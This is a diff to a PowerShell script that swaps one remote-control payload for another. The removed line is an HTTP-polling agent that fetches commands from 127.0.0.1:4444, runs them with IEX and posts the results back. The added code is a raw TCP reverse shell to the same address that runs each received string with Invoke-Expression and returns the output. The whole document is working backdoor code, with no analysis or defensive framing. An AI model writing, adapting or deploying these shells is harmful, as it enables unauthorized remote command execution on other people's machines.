@@ -1,1 +1,20 @@
-$s='127.0.0.1:4444';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
+$tcpClient = New-Object Net.Sockets.TCPClient("127.0.0.1", 4444)
+$stream = $tcpClient.GetStream()
+$bufferSize = 4096
+
+while ($true) {
+    $buffer = New-Object byte[] $bufferSize
+    $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
+
+    if ($bytesRead -eq 0) {
+        break
+    }
+
+    $receivedData = [Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)
+    $commandOutput = Invoke-Expression -Command $receivedData 2>&1
+    $encodedOutput = [Text.Encoding]::ASCII.GetBytes($commandOutput)
+
+    $stream.Write($encodedOutput, 0, $encodedOutput.Length)
+}
+
+$tcpClient.Close()
